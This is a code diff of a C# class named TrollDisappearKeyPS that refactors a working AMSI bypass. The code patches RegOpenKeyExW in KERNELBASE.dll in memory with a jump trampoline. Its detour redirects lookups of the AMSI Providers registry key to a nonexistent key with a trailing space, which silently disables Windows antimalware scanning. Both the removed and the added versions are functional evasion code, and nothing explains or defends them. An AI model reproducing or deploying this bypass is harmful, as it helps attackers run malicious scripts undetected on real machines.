@@ -2,7 +2,6 @@ using System;
 using System.Linq;
 using System.Runtime.InteropServices;
 
-
 public static class TrollDisappearKeyPS
 {
 
@@ -11,58 +10,6 @@ public static class TrollDisappearKeyPS
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
     public delegate int delegateRegOpenKeyExW(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult);
-
-    static lib hook1 = new lib();
-
-
-
-
-    public static void DisappearKey()
-    {
-        delegateRegOpenKeyExW A = RegOpenKeyWDetour;
-
-        //Replace assembly code for address at RegOpenKeyExW with trampoline to RegOpenKeyWDetour
-        hook1.Install(hook1.GetProcAddress("KERNELBASE.dll", "RegOpenKeyExW"), Marshal.GetFunctionPointerForDelegate(A));
-    }
-
-
-    static private int RegOpenKeyWDetour(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult)
-    {
-        try
-        {
-            //set assembly code for address at RegOpenKeyExW back to original so that we can make the call
-            //we are just tampering the query to lpSubKey
-            hook1.Suspend();
-
-
-            if (lpSubKey == @"Software\Microsoft\AMSI\Providers")
-            {
-                //hijack and provide the wrong key to access
-                return RegOpenKeyExW(hKey, @"Software\Microsoft\AMSI\Providers ", ulOptions, samDesired, out phkResult);
-            }
-
-            return RegOpenKeyExW(hKey, lpSubKey, ulOptions, samDesired, out phkResult);
-
-        }
-        finally
-        {
-            //reinstall the hook
-            hook1.Resume();
-
-        }
-
-    }
-
-}
-
-
-// shortened hooking library 
-public class lib
-{
-    private int oldProtect;
-    private IntPtr targetAddr, hookAddr;
-    private byte[] originalBytes, hookBytes;
-    public const int PAGE_EXECUTE_READWRITE = 0x40;
 
     [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
     public static extern IntPtr GetModuleHandle(string lpModuleName);
@@ -73,46 +20,47 @@ public class lib
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool VirtualProtect(IntPtr lpAddress, int size, int newProtect, out int oldProtect);
 
-    public void Install(IntPtr target, IntPtr hook)
+    static  public int oldProtect;
+    static public IntPtr targetAddr, hookAddr;
+    static public byte[] originalBytes = new byte[12];
+    static public byte[] hookBytes = new byte[12];
+
+
+    public static void DisappearKey()
     {
-        if (target == IntPtr.Zero || hook == IntPtr.Zero)
-            throw new ArgumentException("Invalid address.");
+        delegateRegOpenKeyExW A = RegOpenKeyWDetour;
+        targetAddr = GetProcAddress(GetModuleHandle("KERNELBASE.dll"), "RegOpenKeyExW");
+        hookAddr = Marshal.GetFunctionPointerForDelegate(A);
+        Marshal.Copy(targetAddr, originalBytes, 0, 12);
 
-        targetAddr = target;
-        hookAddr = hook;
-
-        if (!VirtualProtect(targetAddr, 12, PAGE_EXECUTE_READWRITE, out oldProtect))
-            throw new InvalidOperationException("Memory protection change failed.");
-
-        originalBytes = ReadBytes(targetAddr, 12);
-        hookBytes = new byte[] { 0x48, 0xB8 }         // mov rax, immediate64
-            .Concat(BitConverter.GetBytes(hook.ToInt64()))
-            .Concat(new byte[] { 0x50, 0xC3 })         // push rax; ret
+        hookBytes = new byte[] { 0x48, 0xB8 }        
+            .Concat(BitConverter.GetBytes(hookAddr.ToInt64()))
+            .Concat(new byte[] { 0x50, 0xC3 })         
             .ToArray();
 
-        if (!WriteBytes(hookBytes, targetAddr))
-            throw new InvalidOperationException("Write failed.");
+        VirtualProtect(targetAddr, 12, 0x40, out oldProtect);
+        Marshal.Copy(hookBytes, 0, targetAddr, hookBytes.Length);
+
     }
 
-    public void Suspend() => WriteBytes(originalBytes, targetAddr);
-
-    public void Resume() => WriteBytes(hookBytes, targetAddr);
-
-    private byte[] ReadBytes(IntPtr addr, int size)
+    static public int RegOpenKeyWDetour(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult)
     {
-        byte[] buf = new byte[size];
-        Marshal.Copy(addr, buf, 0, size);
-        return buf;
-    }
+        try
+        {
+            Marshal.Copy(originalBytes, 0, targetAddr, hookBytes.Length);
 
-    private bool WriteBytes(byte[] data, IntPtr addr)
-    {
-        try { Marshal.Copy(data, 0, addr, data.Length); return true; }
-        catch { return false; }
-    }
+            if (lpSubKey == @"Software\Microsoft\AMSI\Providers")
+            {
+                return RegOpenKeyExW(hKey, @"Software\Microsoft\AMSI\Providers ", ulOptions, samDesired, out phkResult);
+            }
+            return RegOpenKeyExW(hKey, lpSubKey, ulOptions, samDesired, out phkResult);
 
-    public IntPtr GetProcAddress(string lib, string func)
-        => GetProcAddress(GetModuleHandle(lib), func);
+        }
+        finally
+        {
+            Marshal.Copy(hookBytes, 0, targetAddr, hookBytes.Length);
+        }
+    }
 }
 
 
